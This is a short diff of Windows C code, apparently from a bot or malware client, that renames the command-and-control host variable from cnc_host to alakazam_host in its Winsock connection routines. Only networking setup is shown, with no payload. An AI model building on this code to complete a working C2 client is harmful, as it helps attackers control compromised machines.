@@ -10,7 +10,7 @@
 #include "include/return_code.h"
 
 SOCKET cnc_sock = INVALID_SOCKET;
-char *cnc_host = NULL;
+char *alakazam_host = NULL;
 
 void init_winsock()
 {
@@ -32,7 +32,7 @@ void cnc_get_addrinfo(struct addrinfo **result)
     while (TRUE)
     {
 
-        if (getaddrinfo(cnc_host, CNC_PORT, &hints, result) != 0)
+        if (getaddrinfo(alakazam_host, CNC_PORT, &hints, result) != 0)
         {
             if ((ret = WSAGetLastError()) != WSAHOST_NOT_FOUND)
                 fatal_error("Error at getaddrinfo(): %ld", ret);
@@ -155,7 +155,7 @@ void cnc_init_conn(char *host)
 {
     struct addrinfo *cnc_addrinfo = NULL;
 
-    cnc_host = host;
+    alakazam_host = host;
     init_winsock();
     cnc_get_addrinfo(&cnc_addrinfo);
     cnc_init_sock();
